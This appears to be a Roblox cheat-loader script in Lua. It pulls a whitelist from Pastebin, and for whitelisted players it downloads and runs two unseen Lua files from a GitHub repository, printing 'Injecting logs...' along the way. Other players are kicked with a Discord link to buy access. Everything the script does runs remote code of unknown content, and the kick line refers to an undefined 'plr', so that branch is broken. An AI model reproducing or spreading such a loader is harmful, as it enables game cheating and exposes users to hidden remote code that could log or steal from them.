local USERTable = loadstring(game:HttpGet("https://pastebin.com/3FY8gW53", true))()
if _G.Key == 1 then
    if USERTable[game.Players.LocalPlayer.Name] then
        _G.Key = 2
        print(_G.Key)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/spiderboy764/dontskidladalaw/main/douinky.lua", true))()
        print("Whitelisted Script")
        print("Injecting logs...")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/spiderboy764/dontskidladalaw/main/gang.lua", true))()
    else
        plr:kick("Buy at https://discord.gg/YDzcEh6YuU")
    end
end

if _G.Key == 2 then
    print(_G.Key)
else
    print("Join us at https://discord.gg/YDzcEh6YuU")
end
